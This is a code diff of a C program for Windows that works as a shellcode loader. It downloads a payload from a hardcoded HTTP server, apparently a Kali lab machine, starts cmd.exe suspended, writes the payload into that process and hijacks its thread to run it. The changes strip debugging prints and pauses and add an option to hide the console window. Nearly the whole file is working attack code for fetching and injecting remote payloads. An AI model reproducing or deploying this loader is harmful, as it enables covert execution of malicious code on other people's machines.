@@ -2,48 +2,17 @@
 #include <Windows.h>
 #include <WinInet.h>
 #include <string.h>
-#include <Tlhelp32.h>
+
 #pragma comment (lib, "Wininet.lib")
-#pragma warning (disable:4996)
+//#pragma warning (disable:4996)
 
-
+#define PAYLOAD	L"http://192.168.216.130:8080/tests" // CHANGE THIS TO MATCH YOUR KALI and PYTHON SERVER
 #define TARGET_PROCESS		"cmd.exe"
 
-#define PAYLOAD	L"http://192.168.216.130:8080/tests"
-
-BOOL ProcessENumeration(IN LPWSTR szProcessName, OUT int* PID) {
-	int pid;
-	HANDLE hSnapShot = NULL;
-	PROCESSENTRY32	Proc = {
-				.dwSize = sizeof(PROCESSENTRY32)
-	};
-
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-
-	if (hSnapShot == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
-		return -1;
-	}
-
-	if (!Process32First(hSnapShot, &Proc)) {
-		printf("[!} 32 First Failed with : %d \n", GetLastError());
-		return -1;
-	}
-	do {
-		wprintf(L" [*] Process Name : %s \n", Proc.szExeFile);
-		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
-			*PID = Proc.th32ProcessID;
-			wprintf(L"Process Match : %s \n", Proc.szExeFile);
-
-			break;
-		};
-	} while (Process32Next(hSnapShot, &Proc));
-
-	return 0;
-}
 
 BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
+
+	/*This will grab the payload from the python server and put it to a temp buffer that will then be executed*/
 
 	BOOL		bSTATE = TRUE;
 
@@ -52,10 +21,14 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 
 	DWORD		dwBytesRead = NULL;
 
-	SIZE_T		sSize = NULL; 	 			// Used as the total payload size
+	SIZE_T		sSize = NULL; 	 		
 
-	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
+	PBYTE		pBytes = NULL,					
 		pTmpBytes = NULL;	// Used as the tmp buffer (of size 1024)
+
+	/* These are options below if a HTTPS server is used with self signed certs*/
+
+
 	//DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
 	//	INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;
 
@@ -67,12 +40,14 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
+	// This was used to test https connections ~ not yet implemented
 	//if (!DisableSslVerification(hInternet)) {
 	//	printf("[!] Failed to disable SSL verification\n");
 	//	bSTATE = FALSE;
 	//	goto _EndOfFunction;
 	//}
 	// Opening the handle to the payload using the payload's URL
+
 	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
 	if (!hInternetFile) {
 		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
@@ -125,7 +100,6 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 	}
 
 
-	// Saving 
 	*pPayloadBytes = pBytes;
 	*sPayloadSize = sSize;
 
@@ -142,112 +116,57 @@ _EndOfFunction:
 }
 
 
-//int execute(PBYTE pDeobfuscatedPayload, SIZE_T sDeobfuscatedSize) {
-//	PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-//	if (pShellcodeAddress == NULL) {
-//		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
-//		return -1;
-//	}
-//	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
-//
-//	printf("[#] Press <Enter> To Write Payload ... ");
-//	getchar();
-//	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
-//	/*memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);*/
-//
-//
-//	DWORD dwOldProtection = NULL;
-//	
-//	if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-//		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
-//		return -1;
-//	}
-//	printf("Old Protection: 0x%08X\n", dwOldProtection);
-//	printf("[#] Press <Enter> To Run ... ");
-//	getchar();
-//	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
-//	if (hThread == NULL) {
-//		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
-//		return -1;
-//	}
-//	WaitForSingleObject(hThread, INFINITE);
-//	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
-//	printf("[#] Press <Enter> To Quit ... ");
-//	getchar();
-//	return 0;
-//}
-
 int main() {
+
+	//HWND hWnd = GetConsoleWindow();
+	//ShowWindow(hWnd, SW_HIDE);
 
 	SIZE_T	Size = NULL;
 	PBYTE	Bytes = NULL;
-	int pid_match = 0;
-	LPWSTR test = L"svchost.exe";
-	//HANDLE	hPID_Process = NULL;
-	//DWORD	dwPID_ProcessId = NULL;
-	ProcessENumeration(test, &pid_match);
-	printf("here : %d", pid_match);
 
-	// Reading the payload 
+	// Fetch the Paylaod 
 	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
 		return -1;
 	}
+	//printf("[i] Bytes : 0x%p \n", Bytes);
+	//printf("[i] Size  : %ld \n", Size);
 
+	/////Printing it
+	//for (int i = 0; i < Size; i++) {
+	//	if (i % 16 == 0)
+	//		printf("\n");
 
-	printf("[i] Bytes : 0x%p \n", Bytes);
-	printf("[i] Size  : %ld \n", Size);
-
-	///Printing it
-	for (int i = 0; i < Size; i++) {
-		if (i % 16 == 0)
-			printf("\n");
-
-		printf("%0.2X ", Bytes[i]);
-	}
-	printf("\n\n");
+	//	printf("%0.2X ", Bytes[i]);
+	//}
+	//printf("\n\n");
 	if (Bytes == NULL || Size == 0) {
 		printf("[!] Payload buffer is invalid.\n");
 		return -1;
 	}
-	// Freeing
-	/*LocalFree(Bytes);*/
-	//execute(), sizeof(buf));
-	printf("[#] Press <Enter> To Quit ... ");
-	getchar();
+
 	HANDLE		hProcess = NULL, hThread = NULL;
 
 	DWORD		dwProcessId = NULL;
 
 	PVOID		pAddress = NULL;
 
-
-	//	creating target remote process (in suspended state)
-	printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
+	//printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
 	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
 		return -1;
 	}
-	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
-	printf("[+] DONE \n\n");
 
 
 	// injecting the payload and getting the base address of it
-	printf("[i] Writing Shellcode To The Target Process ... ");
+
 	if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size, &pAddress)) {
 		return -1;
 	}
-	printf("[+] DONE \n\n");
 
 
 	// performing thread hijacking to run the payload
-	printf("[i] Hijacking The Target Thread To Run Our Shellcode ... ");
 	if (!HijackThread(hThread, pAddress)) {
 		return -1;
 	}
-	printf("[+] DONE \n\n");
-
-
-	printf("[#] Press <Enter> To Quit ... ");
-	getchar();
 
 
 	return 0;
@@ -276,8 +195,8 @@ BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT
 	}
 
 	// Creating the full target process path 
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
-	printf("\n\t[i] Running : \"%s\" ... ", lpPath);
+	snprintf(lpPath, sizeof(lpPath), "%s\\System32\\%s", WnDr, lpProcessName);
+
 
 	if (!CreateProcessA(
 		NULL,					// No module name (use command line)
@@ -295,7 +214,7 @@ BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT
 		return FALSE;
 	}
 
-	printf("[+] DONE \n");
+	//printf("[+] DONE \n");
 
 	// Populating the OUT parameters with CreateProcessA's output
 	*dwProcessId = Pi.dwProcessId;
@@ -320,7 +239,7 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN 
 		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
+	//printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
 
 
 	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
@@ -357,9 +276,6 @@ BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
 		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-
-	printf("\n\t[#] Press <Enter> To Run ... ");
-	getchar();
 
 	// resuming suspended thread, thus running our payload
 	ResumeThread(hThread);
